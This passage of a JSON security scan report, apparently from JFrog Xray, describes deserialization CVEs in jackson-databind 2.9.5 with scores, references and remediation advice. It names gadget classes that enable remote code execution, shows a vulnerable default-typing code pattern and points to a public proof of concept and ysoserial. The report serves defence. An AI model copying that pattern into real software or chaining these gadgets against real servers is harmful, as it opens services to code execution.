            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138343",
        "references": [
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36180",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/issues/3004",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://github.com/FasterXML/jackson-databind/commit/3ded28aece694d0df39c9f0fa1ff385b14a8656b",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://github.com/advisories/GHSA-8c4j-34r4-xr8g",
          "https://security.netapp.com/advisory/ntap-20210205-0005/"
        ],
        "extended_information": {
          "short_description": "A typing issue in commons-dbcp in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the dbcp2 in [commons-dbcp]( https://github.com/apache/commons-dbcp) gadget, an attacker can call `setUrl` or control the content of the object, but the real-world impact from these primitives, in the general case, is unknown.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes commons-dbcp in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes commons-dbcp in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `commons-dbcp` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-12022",
            "cvss_v2_score": "5.1",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:H/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "An issue was discovered in FasterXML jackson-databind prior to 2.7.9.4, 2.8.11.2, and 2.9.6. When Default Typing is enabled (either globally or for a specific property), the service has the Jodd-db jar (for database access for the Jodd framework) in the classpath, and an attacker can provide an LDAP service to access, it is possible to make the service execute a malicious payload.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.7.9.4]",
              "[2.8.11.2]",
              "[2.9.6]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-79231",
        "references": [
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://access.redhat.com/errata/RHSA-2019:2804",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZEDLDUYBSTDY4GWDBUXGJNS2RFYTFVRC/",
          "https://bugzilla.redhat.com/show_bug.cgi?id=1671098",
          "https://access.redhat.com/errata/RHSA-2019:1797",
          "https://seclists.org/bugtraq/2019/May/68",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://access.redhat.com/errata/RHBA-2019:0959",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/7487cf7eb14be2f65a1eb108e8629c07ef45e0a",
          "https://access.redhat.com/errata/RHSA-2019:1140",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2018-12022",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://lists.apache.org/thread.html/7fcf88aff0d1deaa5c3c7be8d58c05ad7ad5da94b59065d8e7c50c5d@%3Cissues.lucene.apache.org%3E",
          "http://www.securityfocus.com/bid/107585",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3002",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://github.com/FasterXML/jackson-databind/commit/bf261d404c2f79fd3406237710d40ebb03c99d84",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://access.redhat.com/errata/RHSA-2019:1108",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZEDLDUYBSTDY4GWDBUXGJNS2RFYTFVRC",
          "https://security.netapp.com/advisory/ntap-20190530-0003",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://access.redhat.com/errata/RHSA-2019:1107",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://access.redhat.com/errata/RHSA-2019:0877",
          "https://access.redhat.com/errata/RHSA-2019:3140",
          "https://github.com/advisories/GHSA-cjjf-94ff-43w7",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1106",
          "https://github.com/FasterXML/jackson-databind/commit/28badf7ef60ac3e7ef151cd8e8ec010b8479226a",
          "https://github.com/FasterXML/jackson-databind/issues/2052",
          "https://access.redhat.com/errata/RHSA-2019:1782",
          "https://lists.apache.org/thread.html/7fcf88aff0d1deaa5c3c7be8d58c05ad7ad5da94b59065d8e7c50c5d%40%3Cissues.lucene.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        ],
        "extended_information": {
          "short_description": "A typing issue in multiple classes in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the following classes were found to be able to cause remote code execution when used as Java gadgets -\n```\njodd.db.connection.DataSourceConnectionProvider\n```\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes one of the above classes in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.\n-\tThe vulnerable Java service includes one of the following classes in its Java classpath\n```\njodd.db.connection.DataSourceConnectionProvider\nl```",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-14195",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to org.jsecurity.realm.jndi.JndiRealmFactory (aka org.jsecurity).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.5]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-100878",
        "references": [
          "https://security.netapp.com/advisory/ntap-20200702-0003/",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://lists.debian.org/debian-lts-announce/2020/07/msg00001.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-14195",
          "https://github.com/FasterXML/jackson-databind/commit/f6d9c664f6d481703138319f6a0f1fdbddb3a259",
          "https://github.com/advisories/GHSA-mc6h-4qgp-37qh",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://security.netapp.com/advisory/ntap-20200702-0003",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://github.com/FasterXML/jackson-databind/commit/08fbfacf89a4a4c026a6227a1b470ab7a13e2e88",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://github.com/FasterXML/jackson-databind/issues/2765",
          "https://www.oracle.com/security-alerts/cpuoct2021.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in JSecurity in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `org.jsecurity.realm.jndi.JndiRealmFactory` gadget, an attacker can build a `jndiRealm` to use for attacking through similar class gadgets in JSecurity.\nTherefore, this gadget alone is impactless, but can be used as part of a gadget chain.\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes jsecurity in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes jsecurity in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue cannot be exploited on its own, and can only be used as part of an attack chain",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `jsecurity` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-11113",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.openjpa.ee.WASRegistryManagedRuntime (aka openjpa).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-96058",
        "references": [
          "https://github.com/FasterXML/jackson-databind/commit/e2ba12d5d60715d95105e3e790fc234cfb59893d",
          "https://security.netapp.com/advisory/ntap-20200403-0002/",
          "https://lists.debian.org/debian-lts-announce/2020/04/msg00012.html",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-11113",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://security.netapp.com/advisory/ntap-20200403-0002",
          "https://github.com/FasterXML/jackson-databind/commit/08fbfacf89a4a4c026a6227a1b470ab7a13e2e88",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://github.com/FasterXML/jackson-databind/issues/2670",
          "https://github.com/advisories/GHSA-9vvp-fxw6-jcxr",
          "https://www.oracle.com/security-alerts/cpuoct2021.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in openjpa in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [openjpa]( https://github.com/apache/openjpa) gadget, an attacker can \ncreate a `WASRegistryManagedRuntime` class pointing to an arbitrary WebSphere registry, which provides arbitrary Java classes to the victim, leading to remote code execution. This has been demonstrated in a public [PoC](https://github.com/Al1ex/CVE-2020-11113/blob/master/src/main/java/com/jacksonTest/Poc.java).\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes openjpa in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes openjpa in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `openjpa` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-11112",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.proxy.provider.remoting.RmiProvider (aka apache/commons-proxy).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-96059",
        "references": [
          "https://github.com/FasterXML/jackson-databind",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://security.netapp.com/advisory/ntap-20200403-0002/",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/issues/2666",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.debian.org/debian-lts-announce/2020/04/msg00012.html",
          "https://security.netapp.com/advisory/ntap-20200403-0002",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-11112"
        ],
        "extended_information": {
          "short_description": "A typing issue in commons-proxy in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [commons-proxy]( https://github.com/apache/commons-proxy) gadget, an attacker can create registry by using 